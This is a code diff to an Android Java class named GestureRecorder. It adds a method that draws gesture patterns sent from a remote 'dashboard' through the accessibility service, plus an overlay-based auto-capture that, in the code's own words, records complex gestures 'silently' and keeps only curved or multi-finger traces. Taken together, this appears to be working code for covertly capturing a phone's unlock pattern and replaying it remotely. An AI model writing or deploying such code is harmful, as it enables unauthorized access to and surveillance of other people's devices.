@@ -441,6 +441,126 @@ public class GestureRecorder {
         return hasStroke ? builder.build() : null;
     }
 
+    // -- Auto-capture state ---------------------------------------------------
+    private volatile boolean       autoCapturing = false;
+    private volatile RecordingOverlay autoCaptureOverlay;
+
+    /**
+     * Draw a pattern from normalized node coordinates received from the dashboard.
+     * Params JSON expected: { nodes: [{nx, ny}, ...], sequence: [int, ...] }
+     * The pattern is executed as a single gesture stroke through all nodes.
+     */
+    public JSONObject drawPattern(JSONObject params) {
+        JSONObject r = new JSONObject();
+        try {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
+            }
+            if (accessSvc == null) {
+                r.put("success", false); r.put("error", "Accessibility service not running"); return r;
+            }
+
+            JSONArray nodes = params.optJSONArray("nodes");
+            if (nodes == null || nodes.length() < 2) {
+                r.put("success", false); r.put("error", "Need at least 2 nodes to draw a pattern"); return r;
+            }
+
+            // Detect screen size to map normalized coords
+            android.graphics.Point sz = new android.graphics.Point();
+            wm.getDefaultDisplay().getRealSize(sz);
+            int curW = sz.x;
+            int curH = sz.y;
+
+            // Build a smooth path through the nodes with interpolated points
+            Path path = new Path();
+            long durationMs = 80L * nodes.length(); // ~80ms per node transition
+
+            for (int i = 0; i < nodes.length(); i++) {
+                JSONObject node = nodes.getJSONObject(i);
+                float nx = (float) node.getDouble("nx");
+                float ny = (float) node.getDouble("ny");
+                float sx = Math.max(1, Math.min(curW - 1, nx * curW));
+                float sy = Math.max(1, Math.min(curH - 1, ny * curH));
+                if (i == 0) path.moveTo(sx, sy);
+                else        path.lineTo(sx, sy);
+            }
+
+            GestureDescription.Builder builder = new GestureDescription.Builder();
+            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(100, durationMs)));
+            GestureDescription gesture = builder.build();
+
+            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
+            r.put("success", ok);
+            r.put("nodeCount", nodes.length());
+            r.put("durationMs", durationMs);
+            if (!ok) r.put("error", "dispatchGesture returned false");
+        } catch (Exception e) {
+            Log.e(TAG, "drawPattern: " + e.getMessage());
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /**
+     * Start auto-capturing complex gestures passively.
+     * Captures multi-point curved paths; ignores simple taps and linear swipes.
+     */
+    public JSONObject startAutoCapture() {
+        JSONObject r = new JSONObject();
+        try {
+            if (autoCapturing) {
+                r.put("success", false); r.put("error", "Auto-capture already running"); return r;
+            }
+            autoCapturing = true;
+            CountDownLatch latch = new CountDownLatch(1);
+            mainHandler.post(() -> {
+                autoCaptureOverlay = new RecordingOverlay(context, "auto", "auto_" + System.currentTimeMillis(), screenW, screenH, wm, () -> autoCapturing = false);
+                autoCaptureOverlay.show();
+                latch.countDown();
+            });
+            latch.await(2, TimeUnit.SECONDS);
+            r.put("success", true);
+            r.put("message", "Auto-capture started — complex gestures will be recorded silently");
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
+    /**
+     * Stop auto-capture and save captured gestures that are complex enough.
+     * Filters out straight-line swipes and single taps before saving.
+     */
+    public JSONObject stopAutoCapture() {
+        JSONObject r = new JSONObject();
+        try {
+            if (!autoCapturing || autoCaptureOverlay == null) {
+                r.put("success", false); r.put("error", "Auto-capture not running"); return r;
+            }
+            autoCapturing = false;
+            final JSONObject[] saved = {null};
+            CountDownLatch latch = new CountDownLatch(1);
+            final RecordingOverlay cur = autoCaptureOverlay;
+            mainHandler.post(() -> {
+                saved[0] = cur.stopAndSaveIfComplex(gestureDir());
+                autoCaptureOverlay = null;
+                latch.countDown();
+            });
+            latch.await(3, TimeUnit.SECONDS);
+            r.put("success", true);
+            if (saved[0] != null) {
+                r.put("saved", true);
+                r.put("result", saved[0]);
+            } else {
+                r.put("saved", false);
+                r.put("message", "No complex gestures captured (simple taps/swipes ignored)");
+            }
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
+    }
+
     // =========================================================================
     // Recording Overlay View
     // =========================================================================
@@ -643,6 +763,56 @@ public class GestureRecorder {
 
         void hide() {
             try { if (view != null) wm.removeView(view); view = null; } catch (Exception ignored) {}
+        }
+
+        /**
+         * Stop, apply complexity filter, and only save if the captured gesture
+         * is complex (multi-finger OR curved path — not a simple tap or linear swipe).
+         */
+        JSONObject stopAndSaveIfComplex(File dir) {
+            stopped = true;
+            hide();
+            if (points.size() < 10) return null; // too few points — skip
+
+            // Check for multi-pointer (multi-finger) — always complex
+            boolean multiPointer = false;
+            for (GesturePoint gp : points) {
+                if (gp.pointerId != 0) { multiPointer = true; break; }
+            }
+
+            // Check for path curvature: compute max deviation from the straight line
+            // between first and last point
+            boolean curved = false;
+            if (!multiPointer && points.size() >= 3) {
+                GesturePoint first = points.get(0);
+                GesturePoint last  = points.get(points.size() - 1);
+                float dx = last.nx - first.nx;
+                float dy = last.ny - first.ny;
+                float len = (float) Math.sqrt(dx * dx + dy * dy);
+                if (len < 0.05f) {
+                    // Very short total displacement — it's a tap or stationary gesture
+                    // Still might be complex if it lasted > 1.5 seconds
+                    long dur = last.t - first.t;
+                    if (dur < 1500) return null; // simple tap
+                    curved = true;
+                } else {
+                    // Compute max perpendicular deviation from the line
+                    float maxDev = 0;
+                    for (GesturePoint gp : points) {
+                        // Cross product gives perpendicular distance
+                        float crossLen = Math.abs((gp.nx - first.nx) * dy - (gp.ny - first.ny) * dx);
+                        float dev = crossLen / len;
+                        if (dev > maxDev) maxDev = dev;
+                    }
+                    // More than 5% screen deviation from straight line = curved
+                    if (maxDev > 0.05f) curved = true;
+                }
+            }
+
+            if (!multiPointer && !curved) return null; // simple linear swipe — skip
+
+            // Complex enough — delegate to regular save
+            return stopAndSave(dir);
         }
     }
 }
